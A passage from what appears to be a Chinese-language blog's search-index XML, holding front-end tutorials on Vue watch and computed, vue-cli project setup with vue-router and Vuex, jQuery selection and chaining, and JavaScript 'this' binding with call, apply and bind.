<li>watch的几种写法<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 写法1</span></span><br><span class="line">watch: &#123;</span><br><span class="line">    o1: <span class="function"><span class="params">()</span>=&gt;</span>&#123;&#125;,  <span class="comment">// 不要使用箭头函数，因为这里的this是全局对象</span></span><br><span class="line">    o2: <span class="function"><span class="keyword">function</span>(<span class="params">value, oldValue</span>)</span>&#123;&#125;,</span><br><span class="line">    o3: ()&#123;&#125;,</span><br><span class="line">    o4: [f1,f2],</span><br><span class="line">    o5: <span class="string">'methodName'</span>,</span><br><span class="line">    o6: &#123;</span><br><span class="line">        handler: fn,</span><br><span class="line">        deep: <span class="literal">true</span>,</span><br><span class="line">        immediate: <span class="literal">true</span>,</span><br><span class="line">        <span class="string">'obj.a'</span>: <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;&#125;</span><br><span class="line">    &#125;,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 写法2</span></span><br><span class="line">vm.$watch(<span class="string">'n'</span>, <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="built_in">console</span>,log(<span class="string">'n 变了'</span>)</span><br><span class="line">&#125;), &#123;<span class="attr">immediate</span>: <span class="literal">true</span>&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// 写法3：放在钩子里</span></span><br><span class="line">created()&#123;</span><br><span class="line">    <span class="keyword">this</span>.$watch(<span class="string">'n'</span>, <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">'n 变了'</span>)</span><br><span class="line">    &#125;, &#123;<span class="attr">immediate</span>: <span class="literal">true</span>&#125;)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
</ul>
<h2 id="computed-VS-watch"><a href="#computed-VS-watch" class="headerlink" title="computed VS. watch"></a>computed VS. watch</h2><ol>
<li>computed 用来计算出一个值，这个值在调用时不需要加括号，可以当属性用；并且会根据依赖自动缓存，如果依赖不变，computed的值就不会重新计算</li>
<li>watch 用来监听，若某个属性发生变化，就去执行一个函数。它有两个选项：immediate表示第一次渲染时，是否执行这个函数；deep表示监听一个对象时，是否要监听对象里面的变化</li>
</ol>
]]></content>
  </entry>
  <entry>
    <title>vue-cli脚手架搭建项目</title>
    <url>/2018/08/23/vue-cli%E8%84%9A%E6%89%8B%E6%9E%B6%E6%90%AD%E5%BB%BA%E9%A1%B9%E7%9B%AE/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>项目搭建、目录结构分析及vue-router、Vuex的使用<br><a id="more"></a></p>
<h2 id="项目搭建"><a href="#项目搭建" class="headerlink" title="项目搭建"></a>项目搭建</h2><p>1、在电脑上安装最新版的nodeJS，安装完成后安装淘宝镜像<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">npm install -g cnpm --registry=https://registry.npm.taobao.org</span><br></pre></td></tr></table></figure></p>
<p>2、全局安装vue-cli<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">npm install -g vue-cli</span><br></pre></td></tr></table></figure></p>
<p>// 如果已经安装过nodejs和vue-cli，可直接进行项目初始化</p>
<p>3、进入想要存放项目文件的目录下，然后初始化项目<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">vue init webpack my-project</span><br></pre></td></tr></table></figure></p>
<p>4、进入项目文件<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cd my-project</span><br></pre></td></tr></table></figure></p>
<p>5、安装依赖<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">npm install</span><br></pre></td></tr></table></figure></p>
<p>6、启动项目<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">npm run dev</span><br></pre></td></tr></table></figure></p>
<p>打开<a href="http://localhost:8080，你会看到" target="_blank" rel="noopener">http://localhost:8080，你会看到</a><br><img src="https://i.loli.net/2018/08/23/5b7e8b818bc8e.png" alt="alt text"></p>
<h2 id="目录结构"><a href="#目录结构" class="headerlink" title="目录结构"></a>目录结构</h2><p>build  项目构建(webpack)相关代码</p>
<ul>
<li>build.js  // 生产环境构建代码</li>
<li>check-version.js  // 检查node&amp;npm等版本</li>
<li>dev-client.js  // 热加载相关</li>
<li>dev-server.js  // 构建本地服务器</li>
<li>utils.js  // 构建配置共用工具</li>
<li>vue-loader.conf.js  // vue加载器</li>
<li>webpack.base.conf.js  // webpack基础环境配置</li>
<li>webpack.dev.conf.js  // webpack开发环境配置</li>
<li>webpack.prod.conf.js  // webpack生产环境配置</li>
</ul>
<p>config  项目开发环境配置相关代码</p>
<ul>
<li>dev.env.js  // 开发环境变量</li>
<li>index.js  // 项目一些配置变量</li>
<li>prod.env.js  // 生产环境变量</li>
</ul>
<p>node_modules 项目依赖模块，npm install执行后初始化项目会将所有依赖放在这里</p>
<p>src  源码目录</p>
<ul>
<li>assets  // 资源目录 eg：logo.png</li>
<li>components  // vue公共组件 eg：App.vue</li>
<li>router  // 前端路由 eg：index.js路由配置文件</li>
<li>App.vue  // 页面入口文件（根组件）</li>
<li>main.js  // 程序入口文件（入口js文件）</li>
</ul>
<p>static  静态文件（比如图片、json数据等）</p>
<ul>
<li>.gitkeep</li>
</ul>
<p>其他</p>
<ul>
<li>.babelrc  // ES6语法编译配置</li>
<li>.editorconfig  // 定义代码格式</li>
<li>.gitignore  // git上传需要忽略的文件格式</li>
<li>index.html  // 入口页面</li>
<li>package.json  // 项目基本信息</li>
<li>README.md  // 项目说明</li>
</ul>
<h2 id="vue-router路由"><a href="#vue-router路由" class="headerlink" title="vue-router路由"></a>vue-router路由</h2><p>1、安装<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">npm install --save vue-router</span><br></pre></td></tr></table></figure></p>
<p>2、引用<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import router from &apos;vue-router&apos;</span><br><span class="line">Vue.use(router)</span><br></pre></td></tr></table></figure></p>
<p>3、配置路由文件，并在vue实例中注入<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">var rt = new router(&#123;</span><br><span class="line">  routes: [  // 配置</span><br><span class="line">    &#123;</span><br><span class="line">      path: &apos;/hello&apos;, //指定要跳转的路径</span><br><span class="line">      component: HelloWorld //指定要跳转的组件</span><br><span class="line">    &#125;</span><br><span class="line">  ]</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">new Vue(&#123;</span><br><span class="line">    el: &apos;#app&apos;,</span><br><span class="line">    router:router,  // 实例中注入</span><br><span class="line">    components: &#123;</span><br><span class="line">        App</span><br><span class="line">    &#125;,</span><br><span class="line">    template: &apos;&lt;App/&gt;&apos;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure></p>
<p>4、确定视图加载位置<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;router-view&gt;&lt;/router-view&gt;</span><br></pre></td></tr></table></figure></p>
<h3 id="路由的跳转"><a href="#路由的跳转" class="headerlink" title="路由的跳转"></a>路由的跳转</h3><p><router-link to="/"></router-link><br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;template&gt;</span><br><span class="line">    &lt;ul&gt;</span><br><span class="line">        &lt;li&gt;</span><br><span class="line">            &lt;router-link to=&quot;/helloworld&quot;&gt;HELLO WORLD&lt;/router-link&gt;</span><br><span class="line">        &lt;/li&gt;</span><br><span class="line">        &lt;li&gt;</span><br><span class="line">            &lt;router-link to=&quot;/helloearth&quot;&gt;HELLO EARTH&lt;/router-link&gt;</span><br><span class="line">        &lt;/li&gt;</span><br><span class="line">    &lt;/ul&gt;</span><br><span class="line">&lt;/template&gt;</span><br></pre></td></tr></table></figure></p>
<h3 id="路由参数的传递"><a href="#路由参数的传递" class="headerlink" title="路由参数的传递"></a>路由参数的传递</h3><p>1、必须在路由内加入路由的name</p>
<p>2、必须在path后加/: +传递的参数</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;router-link :to=&quot;&#123; name: helloearth, params: &#123;msg: 只有一个地球&#125; &#125;&quot;&gt;HELLO WORLD&lt;/router-link&gt;</span><br><span class="line">读取参数： $route.params.XXX</span><br><span class="line">方式：===/helloworld/你好世界</span><br><span class="line"></span><br><span class="line">&lt;router-link :to=&quot;&#123; path: &apos;/helloearth&apos;, query: &#123;msg: 只有一个地球&#125; &#125;&quot;&gt;HELLO WORLD&lt;/router-link&gt;</span><br><span class="line">方式：===/helloworld?name=XX&amp;count=xxx</span><br><span class="line"></span><br><span class="line">函数模式：</span><br><span class="line">可以创建一个函数返回 props，这样便可以将参数转换成另一种类型，将静态值与基于路由的值结合</span><br><span class="line">const router = new VueRouter(&#123;</span><br><span class="line">    routes: [</span><br><span class="line">        &#123;</span><br><span class="line">            path: &apos;/search&apos;,</span><br><span class="line">            component: SearchUser,</span><br><span class="line">            props: (route) =&gt; (&#123;</span><br><span class="line">                query: route.query.q</span><br><span class="line">            &#125;)</span><br><span class="line">        &#125;</span><br><span class="line">    ]</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>
<h2 id="Vuex的store状态管理"><a href="#Vuex的store状态管理" class="headerlink" title="Vuex的store状态管理"></a>Vuex的store状态管理</h2><p>用来管理状态，共享数据，在各个组件之间管理外部状态，使用方法：</p>
<ul>
<li><p>安装Vuex</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">npm install vuex</span><br></pre></td></tr></table></figure>
</li>
<li><p>引入vuex，并通过use方法使用</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import Vuex from &apos;vuex&apos;</span><br><span class="line">Vue.use(Vuex)</span><br></pre></td></tr></table></figure>
</li>
<li><p>创建状态仓库</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">//  Store必须是大写，参数state不能改名字</span><br><span class="line">var store = new Vue.Store(&#123;</span><br><span class="line">    state: &#123;</span><br><span class="line">        xxx: yyy</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>
</li>
<li><p>通过 this.$store.state.xxx 拿到全局状态</p>
</li>
</ul>
<h3 id="Vuex下的mutations、actions和getters"><a href="#Vuex下的mutations、actions和getters" class="headerlink" title="Vuex下的mutations、actions和getters"></a>Vuex下的mutations、actions和getters</h3><p>vuex状态管理的流程：</p>
<p>view -&gt; actions -&gt; mutations –&gt; state —­&gt; view</p>
<p>mutations和actions的不同之处：</p>
<ul>
<li>参数：mutations接收的参数是state，actions接收的是context</li>
<li>异步操作：mutations只能包含同步操作，而actions可以包含异步操作</li>
<li>mutations直接变更状态（state），而actions提交的是mutation而非直接变更状态</li>
<li>调用方式：mutations通过this.$store.commit(‘’)调用，actions通过this.$store.dispatch(‘’)调用</li>
</ul>
<p>注意：actions是可有可无的，没有actions的话，view直接走mutations中的逻辑，但是如果有异步操作，则必须使用actions</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">var store = new Vue.Store(&#123;</span><br><span class="line">    state: &#123;</span><br><span class="line">        xxx: yyy</span><br><span class="line">    &#125;,</span><br><span class="line">    mutations: &#123;  // 调用：this.$store.commit(&apos;xxx&apos;)参数为字符串格式</span><br><span class="line">        aaa:function(state)&#123;</span><br><span class="line">            // 一些操作</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;,</span><br><span class="line">    actions: &#123;  // 调用：this.$store.dispatch(&apos;xxx&apos;)</span><br><span class="line">        bbb:function(context)&#123;</span><br><span class="line">            context.commit(&apos;aaa&apos;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;,</span><br><span class="line">    getters:&#123;  // 调用：this.$store.getters.ccc</span><br><span class="line">        ccc(state)&#123;</span><br><span class="line">            return ... ...</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>
]]></content>
      <tags>
        <tag>vue-cli</tag>
      </tags>
  </entry>
  <entry>
    <title>jQuery设计思想与实践</title>
    <url>/2022/03/28/jQuery%E8%AE%BE%E8%AE%A1%E6%80%9D%E6%83%B3%E4%B8%8E%E5%AE%9E%E8%B7%B5/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><ul>
<li>jQuery设计思想：选择某个网页元素，然后对其进行操作</li>
<li>jQuery(css选择器)用于获取对应元素，但它不返回这些元素，而是返回一个对象api(这个对象可以直接操作对应的元素)</li>
<li>使用jQuery的第一步，将一个选择表达式，放进构造函数jQuery()，得到被选中的元素</li>
</ul>
<h2 id="选择网页元素"><a href="#选择网页元素" class="headerlink" title="选择网页元素"></a>选择网页元素</h2><p>选择表达式可以是CSS选择器<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">$(<span class="built_in">document</span>) <span class="comment">// 整个文档对象</span></span><br><span class="line">$(<span class="string">'#myId'</span>)  <span class="comment">// 选择ID为myId的网页元素</span></span><br><span class="line">$(<span class="string">'div.myClass'</span>)  <span class="comment">// 选择class为myClass的 div 元素</span></span><br><span class="line">$(<span class="string">'input[name=first]'</span>)  <span class="comment">// 选择name属性=first的 input 元素</span></span><br></pre></td></tr></table></figure></p>
<p>也可以是jQuery特有表达式<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">$(<span class="string">'a:first'</span>)  <span class="comment">// 选择网页中第一个a元素</span></span><br><span class="line">$(<span class="string">'tr:odd'</span>)  <span class="comment">// 选择表格的奇数行</span></span><br><span class="line">$(<span class="string">'#myForm: input'</span>)  <span class="comment">// 选择表单中的input元素</span></span><br><span class="line">$(<span class="string">'div:visible'</span>)  <span class="comment">// 选择可见的div元素</span></span><br><span class="line">$(<span class="string">'div:gt(2)'</span>)  <span class="comment">// 选择所有的div元素，除了前三个</span></span><br><span class="line">$(<span class="string">'div:animated'</span>)  <span class="comment">// 选择当前处于动画状态的div元素</span></span><br></pre></td></tr></table></figure></p>
<h2 id="改变结果集"><a href="#改变结果集" class="headerlink" title="改变结果集"></a>改变结果集</h2><p>提供各种强大的过滤器，对结果集进行筛选，缩小选择结果<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">$(<span class="string">'div'</span>).has(<span class="string">'p'</span>)  <span class="comment">// 选择包含p元素的div</span></span><br><span class="line">$(<span class="string">'div'</span>).not(<span class="string">'.myClass'</span>)  <span class="comment">// 选择class不等于myClass的div元素</span></span><br><span class="line">$(<span class="string">'div'</span>).filter(<span class="string">'.myClass'</span>)  <span class="comment">// 选择class等于myClass的div元素</span></span><br><span class="line">$(<span class="string">'div'</span>).first()  <span class="comment">// 选择第一个div元素</span></span><br><span class="line">$(<span class="string">'div'</span>).eq(<span class="number">5</span>) <span class="comment">// 选择第6个div元素</span></span><br></pre></td></tr></table></figure></p>
<p>有时需要从结果集出发，移动到附近的相关元素<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">$(<span class="string">'div'</span>).next(<span class="string">'p'</span>)  <span class="comment">// 选择div元素后面的第一个p元素</span></span><br><span class="line">$(<span class="string">'div'</span>).parent()  <span class="comment">// 选择div元素的父元素</span></span><br><span class="line">$(<span class="string">'div'</span>).closest(<span class="string">'form'</span>)  <span class="comment">// 选择离div最近的form元素</span></span><br><span class="line">$(<span class="string">'div'</span>).children()  <span class="comment">// 选择div的所有子元素</span></span><br><span class="line">$(<span class="string">'div'</span>).siblings()  <span class="comment">// 选择div的同级元素</span></span><br></pre></td></tr></table></figure></p>
<h2 id="链式操作"><a href="#链式操作" class="headerlink" title="链式操作"></a>链式操作</h2><p>选中网页元素后，对它进行一系列操作，操作可以像链条一样连接起来。原理在于每次jQuery操作返回的都是一个jQuery对象，而不是元素<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">$(<span class="string">'.test'</span>).find(<span class="string">'span'</span>).addClass(<span class="string">'.yellow'</span>).text(<span class="string">'hi，我是新加的内容'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 拆分开</span></span><br><span class="line">$(<span class="string">'.test'</span>) <span class="comment">// 找到div元素，不返回元素们，而是返回一个api对象</span></span><br><span class="line">    .find(<span class="string">'span'</span>)  <span class="comment">// 选择其中的span元素</span></span><br><span class="line">    .addClass(<span class="string">'.yellow'</span>)  <span class="comment">// 遍历所有刚才获取到的span元素，添加'.yellow'</span></span><br><span class="line">    .text(<span class="string">'hi，我是新加的内容'</span>)  <span class="comment">// 将文本内容进行替换</span></span><br></pre></td></tr></table></figure></p>
<p>jQuery 还提供了 end() 方法，可使结果集后退一步<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">$(<span class="string">'div'</span>)</span><br><span class="line">    .find(<span class="string">'h3'</span>)</span><br><span class="line">    .eq(<span class="number">2</span>)</span><br><span class="line">    .html(<span class="string">'Hello'</span>)</span><br><span class="line">    .end()  <span class="comment">//退回到选中所有的h3元素的那一步</span></span><br><span class="line">    .eq(<span class="number">0</span>)  <span class="comment">//选中第一个h3元素</span></span><br><span class="line">    .html(<span class="string">'World'</span>);  <span class="comment">//将它的内容改为World</span></span><br></pre></td></tr></table></figure></p>
<h2 id="取值getter-和-赋值setter"><a href="#取值getter-和-赋值setter" class="headerlink" title="取值getter 和 赋值setter"></a>取值getter 和 赋值setter</h2><p>jQuery使用同一个函数，完成取值和赋值，这是由函数的参数来决定<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">$(<span class="string">'h1'</span>).html()  <span class="comment">// html没有参数，表明是取值</span></span><br><span class="line">$(<span class="string">'h1'</span>).html(<span class="string">'hi'</span>)  <span class="comment">// html有参数，表明是赋值</span></span><br></pre></td></tr></table></figure></p>
<p>常见的取值和赋值函数<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">.html() <span class="comment">//取出或设置html内容</span></span><br><span class="line">.text() <span class="comment">//取出或设置text内容</span></span><br><span class="line">.attr() <span class="comment">//取出或设置某个属性的值</span></span><br><span class="line">.width()  <span class="comment">//取出或设置某个元素的宽度</span></span><br><span class="line">.height() <span class="comment">//取出或设置某个元素的高度</span></span><br><span class="line">.val() <span class="comment">//取出某个表单元素的值</span></span><br></pre></td></tr></table></figure></p>
<p>注意：</p>
<ul>
<li><p>如果结果集包含多个元素，赋值时，将对其中所有元素赋值；取值时，则只取出第一个元素的值</p>
</li>
<li><p>.text()例外，它取出所有元素的text内容</p>
</li>
</ul>
<h2 id="移动元素"><a href="#移动元素" class="headerlink" title="移动元素"></a>移动元素</h2><p>提供两组方法，操作元素在网页中的位置移动。一是直接移动该元素，二是移动其他元素，使目标元素到达我们想要的位置<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 已经选中了一个div元素，要将它移动到p元素后</span></span><br><span class="line">$(<span class="string">'div'</span>).insertAfter($(<span class="string">'p'</span>));  <span class="comment">// 把div元素移到p元素后</span></span><br><span class="line">$(<span class="string">'p'</span>).after($(<span class="string">'div'</span>));  <span class="comment">// 把p元素加到div元素前</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 看似效果一样，但操作视角不同，返回的元素也不相同。第一种方法返回div元素，第二种方法返回p元素。</span></span><br></pre></td></tr></table></figure></p>
<p>使用该模式的操作方法一共有四对</p>
<ol>
<li>.insertAfter()和.after()：在现存元素的外部，从后面插入元素</li>
<li>.insertBefore()和.before()：在现存元素的外部，从前面插入元素</li>
<li>.appendTo()和.append()：在现存元素的内部，从后面插入元素</li>
<li>.prependTo()和.prepend()：在现存元素的内部，从前面插入元素</li>
</ol>
<h2 id="复制、删除、创建元素"><a href="#复制、删除、创建元素" class="headerlink" title="复制、删除、创建元素"></a>复制、删除、创建元素</h2><ol>
<li>复制元素.clone()</li>
<li>删除元素.remove()和.detach()，区别在于前者不保留被删除元素的事件，后者保留，有利于重新插入文档时使用</li>
<li>清空元素内容，但不删除该元素.empty()</li>
<li>创建新元素，将新元素直接传入jQuery的构造函数<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">$(<span class="string">'&lt;p&gt;Hello&lt;/p&gt;'</span>);</span><br><span class="line"></span><br><span class="line">$(<span class="string">'&lt;li class="new"&gt;new list item&lt;/li&gt;'</span>);</span><br><span class="line"></span><br><span class="line">$(<span class="string">'ul'</span>).append(<span class="string">'&lt;li&gt;list item&lt;/li&gt;'</span>);</span><br></pre></td></tr></table></figure>
</li>
</ol>
]]></content>
  </entry>
  <entry>
    <title>this指向及绑定方法</title>
    <url>/2022/04/11/this%E6%8C%87%E5%90%91%E5%8F%8A%E7%BB%91%E5%AE%9A%E6%96%B9%E6%B3%95/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="this关键字"><a href="#this关键字" class="headerlink" title="this关键字"></a>this关键字</h2><h3 id="this指向"><a href="#this指向" class="headerlink" title="this指向"></a>this指向</h3><p>简单来说，this就是属性或方法当前所指的对象，并且它也总是返回一个对象<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> person = &#123;</span><br><span class="line">    name: <span class="string">"joyce"</span>,</span><br><span class="line">    describe: <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">'姓名：'</span> + <span class="keyword">this</span>.name;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line">person.describe()   <span class="comment">// "姓名：joyce"</span></span><br></pre></td></tr></table></figure></p>
<p>this.name 表示name属性所在对象，name是在describe方法中调用，而describe方法所在的当前对象是person，故this指向person。this.name就是person.name</p>
<h3 id="this指向的可变性"><a href="#this指向的可变性" class="headerlink" title="this指向的可变性"></a>this指向的可变性</h3><p>由于对象属性可以赋给另一个对象，属性所在对象的可变性，所以this指向也是可变的<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">callName</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">'姓名：'</span> + <span class="keyword">this</span>.name</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> A = &#123;</span><br><span class="line">    name: <span class="string">'joyce'</span>,</span><br><span class="line">    describe: callName</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> B = &#123;</span><br><span class="line">    name: <span class="string">'tony'</span>,</span><br><span class="line">    describe: callName</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">A.describe()  <span class="comment">// "姓名：joyce"</span></span><br><span class="line">B.describe()  <span class="comment">// "姓名：tony"</span></span><br></pre></td></tr></table></figure></p>
<p>callName函数内部使用了this关键字，随着callName所在对象不同，this指向也发生改变</p>
<h2 id="绑定this的方法"><a href="#绑定this的方法" class="headerlink" title="绑定this的方法"></a>绑定this的方法</h2><h3 id="Function-prototype-call"><a href="#Function-prototype-call" class="headerlink" title="Function.prototype.call()"></a>Function.prototype.call()</h3><p>该方法可以指定函数内部this的指向（即函数执行时的作用域），然后在指定的作用域中调用该函数<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> obj = &#123;&#125;;</span><br><span class="line"><span class="keyword">var</span> f = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">this</span>;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">f() === <span class="built_in">window</span>  <span class="comment">// true</span></span><br><span class="line">f.call(obj) === obj  <span class="comment">// true</span></span><br></pre></td></tr></table></figure></p>
<p>指定call方法的第一个参数，改变this指向。若参数为空、null、undefined则默认传入全局对象<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> n = <span class="number">123</span>;</span><br><span class="line"><span class="keyword">var</span> obj = &#123; <span class="attr">n</span>: <span class="number">456</span> &#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">a</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="keyword">this</span>.n);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">a.call()  <span class="comment">// 123</span></span><br><span class="line">a.call(<span class="literal">null</span>)  <span class="comment">// 123</span></span><br><span class="line">a.call(<span class="literal">undefined</span>)  <span class="comment">// 123</span></span><br><span class="line">a.call(<span class="built_in">window</span>)  <span class="comment">// 123</span></span><br><span class="line">a.call(obj)  <span class="comment">// 456</span></span><br></pre></td></tr></table></figure></p>
<p>call的第一个参数就是this所要指向的那个对象，后面的参数则是函数调用时所需的参数<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">add</span>(<span class="params">a,b</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> a+b</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">add.call(<span class="keyword">this</span>, <span class="number">1</span>,<span class="number">2</span>)  <span class="comment">// 3</span></span><br></pre></td></tr></table></figure></p>
<h3 id="Function-prototype-apply"><a href="#Function-prototype-apply" class="headerlink" title="Function.prototype.apply()"></a>Function.prototype.apply()</h3><p>apply与call方法类似，同样是改变this指向，然后再调用该函数。唯一区别是apply将参数放在数组里而call需要将参数按顺序传递进去<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">f</span>(<span class="params">x,y</span>) </span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(x+y);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">f.call(<span class="literal">null</span>, <span class="number">1</span>, <span class="number">3</span>)  <span class="comment">// 4</span></span><br><span class="line">f.apply(<span class="literal">null</span>, [<span class="number">1</span>,<span class="number">3</span>])  <span class="comment">// 4</span></span><br></pre></td></tr></table></figure></p>
<p>apply方法的应用</p>
<ol>
<li><p>找出数组最大元素<br>使用apply和Math.max方法，可以返回数组最大元素</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> arr = [<span class="number">1</span>,<span class="number">4</span>,<span class="number">7</span>,<span class="number">10</span>,<span class="number">26</span>,<span class="number">9</span>]</span><br><span class="line"><span class="built_in">Math</span>.max.apply(<span class="literal">null</span>, a)  <span class="comment">// 26</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>将数组中的空元素变为undefined<br>通过apply，利用Array构造函数将数组元素变成undefined</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="built_in">Array</span>.apply(<span class="literal">null</span>, [<span class="string">'a'</span>, ,<span class="string">'b'</span>])  <span class="comment">// ['a',undefined,'b']</span></span><br></pre></td></tr></table></figure>
</li>
</ol>
<p>空元素与undefined差别在于，数组的forEach方法会跳过空元素，但不会跳过undefined。因此遍历内部元素时，会得到不同结果<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> arr = [<span class="string">'a'</span>, ,<span class="string">'b'</span>]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">print</span>(<span class="params">i</span>) </span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(i)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">a.forEach(print)  <span class="comment">// a b</span></span><br><span class="line"><span class="built_in">Array</span>.apply(<span class="literal">null</span>,a).forEach(print)  <span class="comment">// a undefined b</span></span><br></pre></td></tr></table></figure></p>
<ol start="3">
<li>转换类似数组的对象<br>利用数组对象的slice方法，可将一个伪数组（如arguments对象）转为真正的数组<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="built_in">Array</span>.prototype.slice.apply(&#123;<span class="number">0</span>: <span class="number">1</span>, <span class="attr">length</span>: <span class="number">1</span>&#125;)  <span class="comment">// [1]</span></span><br><span class="line"><span class="built_in">Array</span>.prototype.slice.apply(&#123;<span class="number">0</span>: <span class="number">1</span>&#125;)  <span class="comment">// []</span></span><br><span class="line"><span class="built_in">Array</span>.prototype.slice.apply(&#123;<span class="number">0</span>: <span class="number">1</span>, <span class="attr">length</span>: <span class="number">2</span>&#125;)  <span class="comment">// [1, undefined]</span></span><br><span class="line"><span class="built_in">Array</span>.prototype.slice.apply(&#123;<span class="attr">length</span>: <span class="number">1</span>&#125;)  <span class="comment">// [undefined]</span></span><br></pre></td></tr></table></figure>
</li>
</ol>
<p>上述apply方法的参数都是对象，返回结果都是数组，这就达到将对象转为数组的目的，但被处理的对象需要有length属性以及相对应的数字键</p>
<h3 id="Function-prototype-bind"><a href="#Function-prototype-bind" class="headerlink" title="Function.prototype.bind()"></a>Function.prototype.bind()</h3><p>bind()方法会创建一个新函数，称为绑定函数。当调用这个绑定函数时，绑定函数会以创建它时传入 bind() 方法的第一个参数作为 this，传入 bind() 方法的第二个以及以后的参数加上绑定函数运行时本身的参数按照顺序作为原函数的参数来调用原函数。</p>
